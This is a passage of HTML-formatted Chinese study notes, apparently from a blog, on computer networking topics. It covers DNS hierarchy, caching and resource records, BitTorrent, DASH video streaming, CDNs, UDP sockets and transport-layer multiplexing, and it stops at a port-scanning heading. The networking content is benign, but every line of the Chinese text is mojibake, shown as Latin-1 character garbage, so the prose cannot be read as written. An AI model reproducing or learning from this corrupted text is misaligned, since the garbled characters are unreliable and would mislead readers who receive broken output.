æä¾›äº†åœ¨è¿œç¨‹æ–‡ä»¶å¤¹ä¸­æŸ¥è¯¢é‚®ä»¶çš„å‘½ä»¤.</p><h4 id="3-åŸºäº-Web-çš„ç”µå­é‚®ä»¶"><a href="#3-åŸºäº-Web-çš„ç”µå­é‚®ä»¶" class="headerlink" title="3. åŸºäº Web çš„ç”µå­é‚®ä»¶"></a>3. åŸºäº Web çš„ç”µå­é‚®ä»¶</h4><p>ç”¨æˆ·ä»£ç†ä¸ºæ™®é€šçš„æµè§ˆå™¨. ä½¿ç”¨ HTTP åè®®.</p><h2 id="2-4-DNS-å› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡"><a href="#2-4-DNS-å› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡" class="headerlink" title="2.4 DNS: å› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡"></a>2.4 DNS: å› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡</h2><h3 id="2-4-1-DNS-Domain-Name-System-æä¾›çš„æœåŠ¡"><a href="#2-4-1-DNS-Domain-Name-System-æä¾›çš„æœåŠ¡" class="headerlink" title="2.4.1 DNS (Domain Name System) æä¾›çš„æœåŠ¡"></a>2.4.1 DNS (Domain Name System) æä¾›çš„æœåŠ¡</h3><p>è¯†åˆ«ä¸»æœºæœ‰ä¸¤ç§æ–¹å¼:</p><ul><li>ä¸»æœºå (ä¾¿äºäººè®°å¿†)</li><li>IP åœ°å€ (ä¾¿äºè·¯ç”±å™¨å¤„ç†)</li></ul><p>DNS æœåŠ¡å™¨é€šå¸¸æ˜¯è¿è¡Œ BIND (Berkeley Internet Name Domain) è½¯ä»¶çš„ UNIX æœºå™¨.</p><p>DNS åè®®è¿è¡Œåœ¨ UDP ä¹‹ä¸Š, ä½¿ç”¨ 53 å·ç«¯å£.</p><p>DNS åè®®æ˜¯åº”ç”¨å±‚åè®®, é€šå¸¸ç”±å…¶ä»–åº”ç”¨æ›¾åè®®æ‰€ä½¿ç”¨, åŒ…æ‹¬ HTTP, SMTP å’Œ FTP, å°†ç”¨æˆ·æä¾›çš„ä¸»æœºåè§£æä¸º IP åœ°å€.</p><p>DNS åè®®ä¹Ÿä½¿ç”¨å®¢æˆ·-æœåŠ¡å™¨æ¨¡å¼è¿è¡Œåœ¨é€šä¿¡çš„ç«¯ç³»ç»Ÿä¹‹é—´.</p><p>é™¤äº†è¿›è¡Œä¸»æœºååˆ° IP åœ°å€çš„è½¬æ¢å¤–, DNS è¿˜æä¾›äº†ä¸€äº›é‡è¦çš„æœåŠ¡:</p><ul><li>ä¸»æœºåˆ«å (host aliasing)</li><li>é‚®ä»¶æœåŠ¡å™¨åˆ«å (mail server aliasing)</li><li>è´Ÿè½½åˆ†é… (load distribution)</li></ul><h3 id="2-4-2-DNS-å·¥ä½œæœºç†æ¦‚è¿°"><a href="#2-4-2-DNS-å·¥ä½œæœºç†æ¦‚è¿°" class="headerlink" title="2.4.2 DNS å·¥ä½œæœºç†æ¦‚è¿°"></a>2.4.2 DNS å·¥ä½œæœºç†æ¦‚è¿°</h3><h4 id="1-åˆ†å¸ƒå¼ï¼Œå±‚æ¬¡æ•°æ®åº“"><a href="#1-åˆ†å¸ƒå¼ï¼Œå±‚æ¬¡æ•°æ®åº“" class="headerlink" title="1. åˆ†å¸ƒå¼ï¼Œå±‚æ¬¡æ•°æ®åº“"></a>1. åˆ†å¸ƒå¼ï¼Œå±‚æ¬¡æ•°æ®åº“</h4><p>å¤§è‡´æœ‰ä¸‰ç§ç±»å‹çš„ DNS æœåŠ¡å™¨:</p><ul><li>æ ¹ DNS æœåŠ¡å™¨</li><li>é¡¶çº§åŸŸ (Top-Level Domain, TLD) DNS æœåŠ¡å™¨</li><li>æƒå¨ DNS æœåŠ¡å™¨</li></ul><p>å¦‚:<br><img src="/../img/DNS_root_layer.png"></p><p>è¿˜æœ‰æœ¬åœ° DNS æœåŠ¡å™¨ (local DNS server). æ¯ä¸ª ISP éƒ½æœ‰ä¸€å°æœ¬åœ° DNS æœåŠ¡å™¨.</p><p>å½“ä¸»æœºå‘å‡º DNS è¯·æ±‚æ—¶ï¼Œè¯¥è¯·æ±‚è¢«å‘å¾€æœ¬åœ° DNS æœåŠ¡å™¨, å®ƒèµ·ç€ä»£ç†çš„ä½œç”¨ï¼Œå¹¶å°†è¯¥è¯·æ±‚è½¬å‘åˆ° DNS æœåŠ¡å™¨å±‚æ¬¡ç»“æ„ä¸­:</p><p>å¦‚:<br><img src="/../img/redirect_DNS_requese.png"></p><p>æŸ¥è¯¢ä¼¼ä¹æ˜¯ä»åç¼€å¼€å§‹çš„ï¼Œå¦‚ <code>apricot.nyu.edu</code> å…ˆæ‰¾åˆ° <code>.edu</code> ç„¶åæ˜¯ <code>nyu.edu</code>, æœ€åæ‰æŸ¥åˆ° <code>apricot.nyu.edu</code></p><h4 id="2-DNS-ç¼“å­˜-DNS-caching"><a href="#2-DNS-ç¼“å­˜-DNS-caching" class="headerlink" title="2. DNS ç¼“å­˜ (DNS caching)"></a>2. DNS ç¼“å­˜ (DNS caching)</h4><p>æœ¬åœ° DNS æœåŠ¡å™¨å­˜å‚¨ä»å…¶ä»– DNS æœåŠ¡å™¨è·å–çš„æ˜ å°„å…³ç³».</p><p>ç”±äºä¸»æœºåä¸ IP åœ°å€é—´çš„æ˜ å°„å¹¶ä¸æ˜¯æ°¸ä¹…çš„ï¼ŒDNS æœåŠ¡å™¨åœ¨ä¸€æ®µæ—¶é—´å (é€šå¸¸è®¾ç½®ä¸ºä¸¤å¤©) å°†ä¸¢å¼ƒç¼“å­˜çš„ä¿¡æ¯.</p><h3 id="2-4-3-DNS-è®°å½•å’ŒæŠ¥æ–‡"><a href="#2-4-3-DNS-è®°å½•å’ŒæŠ¥æ–‡" class="headerlink" title="2.4.3 DNS è®°å½•å’ŒæŠ¥æ–‡"></a>2.4.3 DNS è®°å½•å’ŒæŠ¥æ–‡</h3><p>èµ„æºè®°å½• (Resource Record, RR).</p><p>RR æä¾›äº†ä¸»æœºååˆ° IP åœ°å€çš„æ˜ å°„.</p><p>èµ„æºè®°å½•æ˜¯åŒ…å«äº†ä¸‹åˆ—å­—æ®µçš„ 4 å…ƒç»„:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">(<span class="hljs-keyword">Name</span>, Value, <span class="hljs-keyword">Type</span>, TTL)<br></code></pre></td></tr></table></figure><p>å«ä¹‰å…·ä½“çœ‹ä¹¦ã€‚</p><p>ç±»å‹ä¸º A çš„èµ„æºè®°å½•æä¾›äº†æ ‡å‡†çš„ä¸»æœºååˆ° IP åœ°å€çš„æ˜ å°„.</p><p>ç±»å‹ä¸º NS çš„è®°å½•ç”¨äºæ²¿ç€æŸ¥è¯¢é“¾æ¥è·¯ç”± DNS æŸ¥è¯¢. åŒ…å«ä¸»æœºåçš„åŸŸ.</p><p>CNAME ç±»å‹çš„è®°å½•è¡¨æ˜æ˜¯åˆ«å. MX ä¹Ÿæ˜¯åˆ«åï¼Œä½†æœ‰ä¸€äº›ä½¿ç”¨ä¸Šçš„åŒºåˆ«: ä¸ºäº†è·å–é‚®ä»¶æœåŠ¡å™¨çš„è§„èŒƒä¸»æœºåï¼ŒDNS å®¢æˆ·åº”å½“è¯·æ±‚ä¸€æ¡ MX è®°å½•; è€Œä¸ºäº†è·å–å…¶ä»–æœåŠ¡çš„è§„èŒƒä¸»æœºåï¼ŒDNS å®¢æˆ·åº”å½“è¯·æ±‚ CNAME è®°å½•.</p><h4 id="1-DNS-æŠ¥æ–‡"><a href="#1-DNS-æŠ¥æ–‡" class="headerlink" title="1. DNS æŠ¥æ–‡"></a>1. DNS æŠ¥æ–‡</h4><p>DNS æœ‰æŸ¥è¯¢å’Œå›ç­”æŠ¥æ–‡ï¼Œæœ‰ç›¸åŒçš„æ ¼å¼:</p><p><img src="/../img/DNS_message.png"></p><p>å…·ä½“è§£æè§ä¹¦.</p><p>ä½¿ç”¨ <code>nslookup</code> å‘½ä»¤å¯ä»¥å‘ä»»ä½• DNS æœåŠ¡å™¨å‘é€ DNS æŸ¥è¯¢.</p><h4 id="2-åœ¨-DNS-æ•°æ®åº“ä¸­æ’å…¥è®°å½•"><a href="#2-åœ¨-DNS-æ•°æ®åº“ä¸­æ’å…¥è®°å½•" class="headerlink" title="2. åœ¨ DNS æ•°æ®åº“ä¸­æ’å…¥è®°å½•"></a>2. åœ¨ DNS æ•°æ®åº“ä¸­æ’å…¥è®°å½•</h4><p>æ³¨å†Œç™»è®°æœºæ„ (registrar) æ˜¯ä¸€ä¸ªå•†ä¸šå®ä½“ï¼Œå®ƒéªŒè¯è¯¥åŸŸåçš„å”¯ä¸€æ€§ï¼Œå°†è¯¥åŸŸåè¾“å…¥ DNS æ•°æ®åº“ï¼Œå¯¹æä¾›çš„æœåŠ¡æ”¶å–å°‘é‡è´¹ç”¨.</p><p>å› ç‰¹ç½‘åå­—å’Œåœ°å€åˆ†é…æœºæ„ (Internet Corporation for Assigned Names and Numbers, ICANN) å‘å„ç§æ³¨å†Œç™»è®°æœºæ„æˆæƒ.</p><h2 id="2-5-P2P-Peer-To-Peer-æ–‡ä»¶åˆ†å‘"><a href="#2-5-P2P-Peer-To-Peer-æ–‡ä»¶åˆ†å‘" class="headerlink" title="2.5 P2P (Peer To Peer) æ–‡ä»¶åˆ†å‘"></a>2.5 P2P (Peer To Peer) æ–‡ä»¶åˆ†å‘</h2><p>åˆ° 2016 å¹´æ­¢ï¼Œæœ€ä¸ºæµè¡Œçš„ P2P æ–‡ä»¶åˆ†å‘åè®®æ˜¯ BitTorrent.</p><h3 id="1-P2P-ä½“ç³»ç»“æ„çš„æ‰©å±•æ€§"><a href="#1-P2P-ä½“ç³»ç»“æ„çš„æ‰©å±•æ€§" class="headerlink" title="1. P2P ä½“ç³»ç»“æ„çš„æ‰©å±•æ€§"></a>1. P2P ä½“ç³»ç»“æ„çš„æ‰©å±•æ€§</h3><h3 id="2-BitTorrent"><a href="#2-BitTorrent" class="headerlink" title="2. BitTorrent"></a>2. BitTorrent</h3><p>ç”¨ BitTorrent çš„æœ¯è¯­æ¥è®², å‚ä¸ä¸€ä¸ªç‰¹å®šæ–‡ä»¶åˆ†å‘çš„æ‰€æœ‰å¯¹ç­‰æ–¹çš„é›†åˆè¢«ç§°ä¸ºä¸€ä¸ªæ´ªæµ (torrent).</p><p>åœ¨ä¸€ä¸ªæ´ªæµä¸­çš„å¯¹ç­‰æ–¹å½¼æ­¤ä¸‹è½½ç­‰é•¿åº¦çš„æ–‡ä»¶å— (chunk).</p><p>æ¯ä¸ªæ´ªæµå…·æœ‰ä¸€ä¸ªåŸºç¡€è®¾æ–½èŠ‚ç‚¹ï¼Œç§°ä¸ºè¿½è¸ªå™¨ (tracker). å½“ä¸€ä¸ªå¯¹ç­‰æ–¹åŠ å…¥æŸæ´ªæµæ—¶ï¼Œå®ƒå‘è¿½è¸ªå™¨æ³¨å†Œè‡ªå·±ï¼Œå¹¶å‘¨æœŸæ€§åœ°é€šçŸ¥è¿½è¸ªå™¨å®ƒä»åœ¨è¯¥æ´ªæµä¸­.</p><p>ä¸åˆ—è¡¨ä¸Šæ‰€æœ‰å¯¹ç­‰æ–¹åˆ›å»ºå¹¶è¡Œçš„ TCP è¿æ¥.</p><p>å¦‚:<br><img src="/../img/tracker_bittorrent.png"></p><p>åœ¨ä»»ä½•ç»™å®šçš„æ—¶åˆ»ï¼ŒAlice å°†å…·æœ‰å—çš„å­é›†å¹¶çŸ¥é“å®ƒçš„é‚»å±…å…·æœ‰å“ªäº›å—.</p><p>ç¨€ç¼ºä¼˜å…ˆæŠ€æœ¯ (rarest first).</p><h2 id="2-6-è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘"><a href="#2-6-è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘" class="headerlink" title="2.6 è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘"></a>2.6 è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘</h2><h3 id="2-6-1-å› ç‰¹ç½‘è§†é¢‘"><a href="#2-6-1-å› ç‰¹ç½‘è§†é¢‘" class="headerlink" title="2.6.1 å› ç‰¹ç½‘è§†é¢‘"></a>2.6.1 å› ç‰¹ç½‘è§†é¢‘</h3><p>åœ¨æµå¼å­˜å‚¨è§†é¢‘åº”ç”¨ä¸­ï¼ŒåŸºç¡€çš„åª’ä½“æ˜¯é¢„å…ˆå½•åˆ¶çš„è§†é¢‘.</p><p>è§†é¢‘æ˜¯ä¸€ç³»åˆ—å›¾åƒï¼Œé€šå¸¸ä»¥ä¸€ç§æ’å®šçš„é€Ÿç‡æ¥å±•ç¤ºã€‚</p><p>ä¸€å‰¯æœªå‹ç¼©ï¼Œæ•°å­—ç¼–ç çš„å›¾åƒç”±åƒç´ é˜µåˆ—ç»„æˆï¼Œå…¶ä¸­æ¯ä¸ªåƒç´ æ˜¯ç”±ä¸€äº›æ¯”ç‰¹ç¼–ç æ¥è¡¨ç¤ºäº®åº¦å’Œé¢œè‰².</p><h3 id="2-6-2-HTTP-æµå’Œ-DASH"><a href="#2-6-2-HTTP-æµå’Œ-DASH" class="headerlink" title="2.6.2 HTTP æµå’Œ DASH"></a>2.6.2 HTTP æµå’Œ DASH</h3><p>åœ¨ HTTP æµä¸­ï¼Œè§†é¢‘åªæ˜¯å­˜å‚¨åœ¨ HTTP æœåŠ¡å™¨ä¸­ä½œä¸ºä¸€ä¸ªæ™®é€šæ–‡ä»¶.</p><p>æ–°å‹çš„åŸºäº HTTP çš„æµï¼Œç» HTTP çš„åŠ¨æ€é€‚åº”æ€§æµ (Dynamic Adaptive Streaming over HTTP, DASH). åœ¨å…¶ä¸­ï¼Œè§†å±ç¼–ç ä¸ºå‡ ä¸ªä¸åŒçš„ç‰ˆæœ¬ï¼Œå…¶ä¸­æ¯ä¸ªç‰ˆæœ¬å…·æœ‰ä¸åŒçš„æ¯”ç‰¹ç‡.</p><p>ä½¿ç”¨ DASH åï¼Œæ¯ä¸ªè§†é¢‘ç‰ˆæœ¬å­˜å‚¨åœ¨ HTTP æœåŠ¡å™¨ä¸­ï¼Œæ¯ä¸ªç‰ˆæœ¬éƒ½æœ‰ä¸€ä¸ªä¸åŒçš„ URL.</p><h3 id="2-6-3-å†…å®¹åˆ†å‘ç½‘"><a href="#2-6-3-å†…å®¹åˆ†å‘ç½‘" class="headerlink" title="2.6.3 å†…å®¹åˆ†å‘ç½‘"></a>2.6.3 å†…å®¹åˆ†å‘ç½‘</h3><p>ä¸ºäº†åº”å¯¹å‘åˆ†å¸ƒäºå…¨ä¸–ç•Œçš„ç”¨æˆ·åˆ†å‘å·¨é‡è§†é¢‘æ•°æ®çš„æŒ‘æˆ˜ï¼Œå‡ ä¹æ‰€æœ‰ä¸»è¦çš„è§†é¢‘æµå…¬å¸éƒ½åˆ©ç”¨å†…å®¹åˆ†å‘ç½‘ (Content Distribution Network, CDN).</p><p>CDN ç®¡ç†åˆ†å¸ƒåœ¨å¤šä¸ªåœ°ç†ä½ç½®ä¸Šçš„æœåŠ¡å™¨ã€‚</p><h4 id="1-CDN-æ“ä½œ"><a href="#1-CDN-æ“ä½œ" class="headerlink" title="1. CDN æ“ä½œ"></a>1. CDN æ“ä½œ</h4><p>å¤§å¤šæ•° CDN åˆ©ç”¨ DNS æ¥æˆªè·å’Œé‡å®šå‘è¯·æ±‚.</p><p><img src="/../img/CDN_using_DNS_redirection.png"></p><h4 id="2-é›†ç¾¤é€‰æ‹©ç­–ç•¥"><a href="#2-é›†ç¾¤é€‰æ‹©ç­–ç•¥" class="headerlink" title="2. é›†ç¾¤é€‰æ‹©ç­–ç•¥"></a>2. é›†ç¾¤é€‰æ‹©ç­–ç•¥</h4><p>é›†ç¾¤é€‰æ‹©ç­–ç•¥ (cluster selection strategy), å³åŠ¨æ€åœ°å°†å®¢æˆ·å®šå‘åˆ° CDN ä¸­çš„æŸä¸ªæœåŠ¡å™¨é›†ç¾¤æˆ–æ•°æ®ä¸­å¿ƒ. </p><p>ä¸ºäº†åŸºäºå½“å‰æµé‡æ¡ä»¶ä¸ºå®¢æˆ·å†³å®šæœ€å¥½çš„é›†ç¾¤ï¼ŒCDN èƒ½å¤Ÿå¯¹å…¶é›†ç¾¤å’Œå®¢æˆ·ä¹‹é—´çš„æ—¶å»¶å’Œä¸¢åŒ…æ€§èƒ½æ‰§è¡Œå‘¨æœŸæ€§çš„å®æ—¶æµ‹é‡ã€‚</p><h3 id="å­¦ä¹ æ¡ˆä¾‹-Netflix-YouTube-å’Œ-â€œçœ‹çœ‹â€"><a href="#å­¦ä¹ æ¡ˆä¾‹-Netflix-YouTube-å’Œ-â€œçœ‹çœ‹â€" class="headerlink" title="å­¦ä¹ æ¡ˆä¾‹: Netflix, YouTube å’Œ â€œçœ‹çœ‹â€"></a>å­¦ä¹ æ¡ˆä¾‹: Netflix, YouTube å’Œ â€œçœ‹çœ‹â€</h3><h4 id="1-Netflix"><a href="#1-Netflix" class="headerlink" title="1. Netflix"></a>1. Netflix</h4><p><img src="/../img/Netflix_CDN_strategy.png"></p><p>Netflix ä¸éœ€è¦ç”¨ DNS é‡å®šå‘æ¥å°†ç‰¹æ®Šçš„å®¢æˆ·è¿æ¥åˆ°ä¸€å° CDN æœåŠ¡å™¨ï¼Œè€Œæ˜¯ç›´æ¥å‘ŠçŸ¥è¯¥å®¢æˆ·ä½¿ç”¨ä¸€å°ç‰¹å®šçš„ CDN æœåŠ¡å™¨.</p><h4 id="2-YouTube"><a href="#2-YouTube" class="headerlink" title="2. YouTube"></a>2. YouTube</h4><h2 id="2-7-å¥—æ¥å­—ç¼–ç¨‹-ç”Ÿæˆç½‘ç»œåº”ç”¨"><a href="#2-7-å¥—æ¥å­—ç¼–ç¨‹-ç”Ÿæˆç½‘ç»œåº”ç”¨" class="headerlink" title="2.7 å¥—æ¥å­—ç¼–ç¨‹: ç”Ÿæˆç½‘ç»œåº”ç”¨"></a>2.7 å¥—æ¥å­—ç¼–ç¨‹: ç”Ÿæˆç½‘ç»œåº”ç”¨</h2><p>æœ‰ä¸¤ç±»:</p><ul><li>æœ‰æ ‡å‡†åè®®ä¸­å®šä¹‰çš„æ“ä½œçš„å®ç°, å…¬å¼€</li><li>å•ç‹¬çš„å¼€å‘å›¢é˜Ÿç ”å‘ï¼Œæœªå…¬å¼€</li></ul><p>åœ¨ç ”å‘é˜¶æ®µï¼Œå¿…é¡»å†³å®šåº”ç”¨ç¨‹åºæ˜¯è¿è¡Œåœ¨ TCP ä¸Šè¿˜æ˜¯è¿è¡Œåœ¨ UDP ä¸Š.</p><p>åº”ç”¨ç¨‹åºéœ€è¦æ³¨æ„é¿å…ä½¿ç”¨å‘¨çŸ¥çš„ç«¯å£å·.</p><h3 id="2-7-1-UDP-å¥—æ¥å­—ç¼–ç¨‹"><a href="#2-7-1-UDP-å¥—æ¥å­—ç¼–ç¨‹" class="headerlink" title="2.7.1 UDP å¥—æ¥å­—ç¼–ç¨‹"></a>2.7.1 UDP å¥—æ¥å­—ç¼–ç¨‹</h3><p>å½“ç”Ÿæˆä¸€ä¸ªå¥—æ¥å­—æ—¶ï¼Œå°±ä¸ºå®ƒåˆ†é…ä¸€ä¸ªç§°ä¸ºç«¯å£å· (port number) çš„æ ‡è¯†ç¬¦.</p><p>å°†æºåœ°å€é™„åœ¨åˆ†ç»„ä¹‹ä¸Šé€šå¸¸å¹¶ä¸æ˜¯ç”± UDP åº”ç”¨ç¨‹åºä»£ç æ‰€ä¸ºï¼Œè€Œæ˜¯ç”±åº•å±‚æ“ä½œç³»ç»Ÿè‡ªåŠ¨å®Œæˆ.</p><p>ä½¿ç”¨ <code>encode()</code> æ–¹æ³•å°†æŠ¥æ–‡ç”±å­—ç¬¦ä¸²ç±»å‹è½¬æ¢ä¸ºå­—èŠ‚ç±»å‹.</p><h1 id="ç¬¬ä¸‰ç« -è¿è¾“å±‚"><a href="#ç¬¬ä¸‰ç« -è¿è¾“å±‚" class="headerlink" title="ç¬¬ä¸‰ç«  è¿è¾“å±‚"></a>ç¬¬ä¸‰ç«  è¿è¾“å±‚</h1><h2 id="3-1-æ¦‚è¿°å’Œè¿è¾“å±‚æœåŠ¡"><a href="#3-1-æ¦‚è¿°å’Œè¿è¾“å±‚æœåŠ¡" class="headerlink" title="3.1 æ¦‚è¿°å’Œè¿è¾“å±‚æœåŠ¡"></a>3.1 æ¦‚è¿°å’Œè¿è¾“å±‚æœåŠ¡</h2><p>è¿è¾“å±‚åè®®ä¸ºè¿è¡Œåœ¨ä¸åŒä¸»æœºä¸Šçš„åº”ç”¨è¿›ç¨‹ä¹‹é—´æä¾›äº†é€»è¾‘é€šä¿¡ (logic communication) åŠŸèƒ½ã€‚æ‰€è°“é€»è¾‘é€šä¿¡ï¼Œå°±æ˜¯ç›¸è·å¾ˆè¿œçš„ä¸»æœºå°±å¥½åƒç›´æ¥ç›¸è¿.</p><p>è¿è¾“å±‚åè®®æ˜¯åœ¨ç«¯ç³»ç»Ÿä¸­è€Œä¸æ˜¯åœ¨è·¯ç”±å™¨ä¸­å®ç°çš„.</p><p>ç½‘ç»œè·¯ç”±å™¨ä»…ä½œç”¨äºè¯¥æ•°æ®æŠ¥çš„ç½‘ç»œå±‚å­—æ®µï¼Œå³ä»–ä»¬ä¸æ£€æŸ¥å°è£…åœ¨è¯¥æ•°æ®æŠ¥çš„è¿è¾“å±‚æŠ¥æ–‡æ®µçš„å­—æ®µ.</p><h3 id="3-1-1-è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„å…³ç³»"><a href="#3-1-1-è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„å…³ç³»" class="headerlink" title="3.1.1 è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„å…³ç³»"></a>3.1.1 è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„å…³ç³»</h3><p>ç½‘ç»œå±‚æä¾›äº† <mark>ä¸»æœº</mark> ä¹‹é—´çš„é€»è¾‘é€šä¿¡.</p><p>è¿è¾“å±‚æä¾›äº†è¿è¡Œåœ¨ä¸åŒä¸»æœºä¸Šçš„ <mark>è¿›ç¨‹</mark> ä¹‹é—´çš„é€»è¾‘é€šä¿¡.</p><p>è¿è¾“åè®®èƒ½å¤Ÿæä¾›çš„æœåŠ¡é•¿é•¿å—é™äºåº•å±‚ç½‘ç»œå±‚åè®®çš„æœåŠ¡æ¨¡å‹.</p><h3 id="3-1-2-å› ç‰¹ç½‘è¿è¾“å±‚æ¦‚è¿°"><a href="#3-1-2-å› ç‰¹ç½‘è¿è¾“å±‚æ¦‚è¿°" class="headerlink" title="3.1.2 å› ç‰¹ç½‘è¿è¾“å±‚æ¦‚è¿°"></a>3.1.2 å› ç‰¹ç½‘è¿è¾“å±‚æ¦‚è¿°</h3><p>åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜åœ¨ç”Ÿæˆå¥—æ¥å­—æ—¶å¿…é¡»æŒ‡å®šæ˜¯é€‰æ‹© UDP è¿˜æ˜¯é€‰æ‹© TCP.</p><p>IP åè®®å¹¶ä¸åšä»»ä½•ç¡®ä¿ï¼Œè¢«ç§°ä¸ºä¸é è°±æœåŠ¡ (unreliable service).</p><p>å°†ä¸»æœºäº¤ä»˜æ‰©å±•åˆ°è¿›ç¨‹é—´äº¤ä»˜è¢«ç§°ä¸º <mark>è¿è¾“å±‚çš„å¤šè·¯å¤ç”¨ (transport-layer multiplexing)</mark> ä¸ <mark>å¤šè·¯åˆ†è§£ (demultiplexing)</mark> .</p><p>TCP æ‹¥å¡æ§åˆ¶æ”¾ç½®ä»»ä½•ä¸€æ¡ TCP è¿æ¥ç”¨è¿‡å¤šæµé‡æ¥æ·¹æ²¡é€šä¿¡ä¸»æœºä¹‹é—´çš„é“¾è·¯å’Œäº¤æ¢è®¾å¤‡.</p><p>UDP æµé‡æ˜¯ä¸å¯è°ƒèŠ‚çš„.</p><h2 id="3-2-å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£"><a href="#3-2-å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£" class="headerlink" title="3.2 å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£"></a>3.2 å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£</h2><p>ä¸€ä¸ªè¿›ç¨‹ï¼Œæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå¥—æ¥å­— (socket), å®ƒç›¸å½“äºä»ç½‘ç»œå‘è¿›ç¨‹ä¼ é€’æ•°æ®å’Œä»è¿›ç¨‹å‘ç½‘ç»œä¼ é€’æ•°æ®çš„é—¨æˆ·.</p><p>å¥—æ¥å­—çš„æ ‡è¯†ç¬¦å–å†³äºå®ƒæ˜¯ UDP è¿˜æ˜¯ TCP å¥—æ¥å­—.</p><p>åœ¨æºä¸»æœºä»ä¸åŒå¥—æ¥å­—ä¸­æ”¶é›†æ•°æ®å—ï¼Œå¹¶ä¸ºæ¯ä¸ªæ•°æ®å—å°è£…ä¸Šé¦–éƒ¨ä¿¡æ¯ä»è€Œç”ŸæˆæŠ¥æ–‡æ®µï¼Œç„¶åå°†æŠ¥æ–‡æ®µä¼ é€’åˆ°ç½‘ç»œå±‚ï¼Œæ‰€æœ‰è¿™äº›å·¥ä½œç§°ä¸º <mark>å¤šè·¯å¤ç”¨ (multiplexing)</mark>. (å¤šè·¯åº”è¯¥æ˜¯åªæ¥æºä¸ºå¤šä¸ªå¥—æ¥å­—) ç›¸å½“äºæ”¶é›†ä¿¡ä»¶.</p><p>å°†è¿è¾“å±‚æŠ¥æ–‡æ®µä¸­çš„æ•°æ®äº¤ä»˜åˆ°æ­£ç¡®çš„å¥—æ¥å­—çš„å·¥ä½œç§°ä¸º <mark>å¤šè·¯åˆ†è§£ (demultiplexing)</mark>, ç›¸å½“äºåˆ†å‘ä¿¡ä»¶.</p><p>ç«¯å£å·æ˜¯ä¸€ä¸ª 16 æ¯”ç‰¹çš„æ•°ï¼Œå…¶å¤§å°åœ¨ 0<del>65535 ä¹‹é—´ï¼Œ0</del>1023 èŒƒå›´çš„ç«¯å£å·ç§°ä¸º <mark>å‘¨çŸ¥ç«¯å£å·</mark>, å…¶ä¿ç•™ç»™å‘¨çŸ¥åº”ç”¨å±‚åè®®ä½¿ç”¨.</p><p>å½“å¼€å‘ä¸€ä¸ªæ–°çš„åº”ç”¨ç¨‹åºæ—¶ï¼Œå¿…é¡»ä¸ºå…¶åˆ†é…ä¸€ä¸ªç«¯å£å·.</p><p>åœ¨ä¸»æœºä¸Šçš„æ¯ä¸ªå¥—æ¥å­—èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªç«¯å£å·ï¼Œå½“æŠ¥æ–‡æ®µåˆ°è¾¾ä¸»æœºæ—¶ï¼Œè¿è¾“å±‚æ£€æŸ¥æŠ¥æ–‡æ®µä¸­çš„ç›®çš„ç«¯å£å·ï¼Œå¹¶å°†å…¶å®šå‘åˆ°ç›¸åº”çš„å¥—æ¥å­—ï¼Œç„¶åæŠ¥æ–‡æ®µä¸­çš„æ•°æ®é€šè¿‡å¥—æ¥å­—è¿›å…¥å…¶æ‰€è¿æ¥çš„è¿›ç¨‹.</p><h3 id="1-æ— è¿æ¥çš„å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£"><a href="#1-æ— è¿æ¥çš„å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£" class="headerlink" title="1. æ— è¿æ¥çš„å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£"></a>1. æ— è¿æ¥çš„å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£</h3><p>é€šå¸¸åº”ç”¨ç¨‹åºçš„å®¢æˆ·ç«¯è®©è¿è¾“å±‚è‡ªåŠ¨åœ°åˆ†é…ç«¯å£å·ï¼Œè€ŒæœåŠ¡å™¨ç«¯åˆ™åˆ†é…ä¸€ä¸ªç‰¹å®šçš„ç«¯å£å·.</p><p>UDP å¥—æ¥å­—æ˜¯ç”±ä¸€ä¸ªäºŒå…ƒç»„å…¨é¢æ ‡è¯†çš„ï¼Œè¯¥äºŒå…ƒç»„åŒ…å«</p><ul><li>ä¸€ä¸ªç›®çš„ IP åœ°å€</li><li>ä¸€ä¸ªç›®çš„ç«¯å£å·.</li></ul><h3 id="2-é¢å‘è¿æ¥çš„å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†è§£"><a href="#2-é¢å‘è¿æ¥çš„å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†è§£" class="headerlink" title="2. é¢å‘è¿æ¥çš„å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†è§£"></a>2. é¢å‘è¿æ¥çš„å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†è§£</h3><p>TCP å¥—æ¥å­—æ˜¯ç”±ä¸€ä¸ªå››å…ƒç»„:</p><ul><li>æº IP åœ°å€</li><li>æºç«¯å£å·</li><li>ç›®çš„ IP åœ°å€</li><li>ç›®çš„ç«¯å£å·</li></ul><p>ä¸»æœºä½¿ç”¨å…¨éƒ¨ 4 ä¸ªå€¼æ¥å°†æŠ¥æ–‡æ®µå®šå‘åˆ°ç›¸åº”çš„å¥—æ¥å­—.</p><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" 